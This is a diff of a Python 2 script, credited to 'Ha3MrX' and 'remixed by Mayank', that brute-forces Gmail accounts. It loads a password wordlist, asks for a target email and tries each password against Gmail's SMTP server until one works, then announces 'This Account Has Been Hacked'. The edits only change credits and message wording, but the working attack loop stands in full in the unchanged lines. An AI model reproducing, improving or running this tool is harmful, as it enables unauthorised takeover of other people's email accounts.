@@ -1,12 +1,10 @@
 #!/usr/bin/python
-'''create by Ha3MrX'''
-
 import smtplib
 from os import system
-
+# Comments begin with a hask mark, not '''
 def main():
    print '================================================='
-   print '               create by Ha3MrX                  '
+   print ' Created by Ha3MrX and remixed by Mayank         '
    print '================================================='
    print '               ++++++++++++++++++++              '
    print '\n                                               '
@@ -48,7 +46,7 @@ pass_file = open(file_path,'r')
 pass_list = pass_file.readlines()
 def login():
     i = 0
-    user_name = raw_input('target email :')
+    user_name = raw_input('Target email:')
     server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
     server.ehlo()
     for password in pass_list:
@@ -59,16 +57,17 @@ def login():
          system('clear')
          main()
          print '\n'
-         print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
+         print '[+] This Account Has Been Hacked! Password :' + password + '     ^_^'
          break
       except smtplib.SMTPAuthenticationError as e:
          error = str(e)
          if error[14] == '<':
             system('clear')
             main()
-            print '[+] this account has been hacked, password :' + password + '     ^_^'
+            print '[+] This account has been hacked! password:' + password + '     ^_^'
 
             break
          else:
             print '[!] password not found => ' + password
+            
 login()
